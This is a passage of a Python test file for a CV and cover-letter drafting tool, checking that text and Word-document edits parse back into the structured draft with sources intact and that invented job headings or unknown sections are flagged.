    first_skill = draft["skills"][0]["category"]
    out, problems = doctext.text_to_cv(text.replace(f"{first_skill}: ", f"{first_skill.lower()}: Rust, "), draft, p)
    assert problems == [] and out["skills"][0]["category"] == first_skill and out["skills"][0]["items"][0] == "Rust"
    names = [pr["name"] for pr in p["projects"]]
    keep = names[0]  # leaving a project out of the text takes it off the CV
    gone = text.split(f"## {names[1]}")[0] + "# SKILLS" + text.split("# SKILLS")[1] if len(names) > 1 and f"## {names[1]}" in text else text
    out, _ = doctext.text_to_cv(gone, draft, p)
    assert [x["id"] for x in out["projects"]][:1] == [p["projects"][0]["id"]] and keep in gone
    for bad, why in (("## Somebody Else | CEO", "isn't a job"), ("# AWARDS", "unknown section")):
        _, problems = doctext.text_to_cv(text.replace(f"## {doctext.job_heading(p['experience'][0])}", bad, 1) if bad.startswith("##")
                                         else text + "\n" + bad, draft, p)
        assert problems and why in problems[0]
    _, problems = doctext.text_to_cv("loose text", draft, p)
    assert "put this under" in problems[0]
    _, problems = doctext.text_to_cv(text.replace(f"{first_skill}: ", f"{first_skill} "), draft, p)
    assert "Category: skill" in problems[0]


def test_letter_as_one_text_keeps_paragraph_sources():
    from cvdrafter import doctext
    p = load_profile()
    draft = post_process(faithful_raw(p), p, LIMITS)[0]
    text = doctext.letter_to_text(draft)
    assert doctext.text_to_letter(text, draft) == draft
    paragraphs = text.split("\n\n")
    merged = "\n\n".join([paragraphs[0] + "\nwraps here", *paragraphs[2:]])  # a line break is a space; one paragraph deleted
    out = doctext.text_to_letter(merged, draft)
    assert out["cover_letter"][0]["text"].endswith(" wraps here") and len(out["cover_letter"]) == len(paragraphs) - 1
    assert out["cover_letter"][0]["sources"] == draft["cover_letter"][0]["sources"]
    assert out["cover_letter"][1]["sources"] == draft["cover_letter"][2]["sources"]


def test_word_edits_are_read_back_into_the_draft(tmp_path, monkeypatch):
    from docx import Document

    from cvdrafter import doctext
    monkeypatch.setattr(config, "OUTPUT_DIR", tmp_path / "out")
    p = load_profile()
    draft = post_process(faithful_raw(p), p, LIMITS)[0]
    draft["experience"]["acme"][0]["text"] = "Built a **Python** classifier"
    files = render.render_documents(draft, p, "Acme", "Intern")
    assert doctext.read_docx(files["cv_docx"], "CV", draft, p) == (draft, [])  # an untouched Word file says what the draft says
    assert doctext.read_docx(files["cl_docx"], "Cover letter", draft, p) == (draft, [])

    cv = Document(files["cv_docx"])
    bullets = [para for para in cv.paragraphs if para.text.startswith("❖") and "Wrote 120" in para.text]
    bullets[0].runs[-1].text = bullets[0].runs[-1].text + " (typed in Word)"
    gone = next(para for para in cv.paragraphs if "Cleaned survey data" in para.text)
    gone._element.getparent().remove(gone._element)
    cv.save(files["cv_docx"])
    new, problems = doctext.read_docx(files["cv_docx"], "CV", draft, p)
    assert problems == []
    assert new["experience"]["acme"][1]["text"] == draft["experience"]["acme"][1]["text"] + " (typed in Word)"
    assert new["experience"]["acme"][1]["sources"] == draft["experience"]["acme"][1]["sources"]
    assert new["experience"]["acme"][0]["text"] == "Built a **Python** classifier"  # bold survives the round trip
    assert len(new["experience"]["beta"]) == len(draft["experience"]["beta"]) - 1

    letter = Document(files["cl_docx"])
    body = next(para for para in letter.paragraphs if para.text.startswith("word word"))
    body.runs[0].text = "Rewritten in Word."
    for extra in body.runs[1:]:
        extra.text = ""
    letter.save(files["cl_docx"])
    new, problems = doctext.read_docx(files["cl_docx"], "Cover letter", draft, p)
    assert problems == [] and new["cover_letter"][0]["text"] == "Rewritten in Word."
    assert new["cover_letter"][0]["sources"] == draft["cover_letter"][0]["sources"]

    header = next(para for para in Document(files["cv_docx"]).paragraphs if para.text.startswith("Acme Bank |"))
    doc = Document(files["cv_docx"])
    next(para for para in doc.paragraphs if para.text.startswith("Acme Bank |")).runs[0].text = "Acme Corp | CEO | "
    doc.save(files["cv_docx"])
    assert "isn't a job" in doctext.read_docx(files["cv_docx"], "CV", draft, p)[1][0]
    assert header is not None
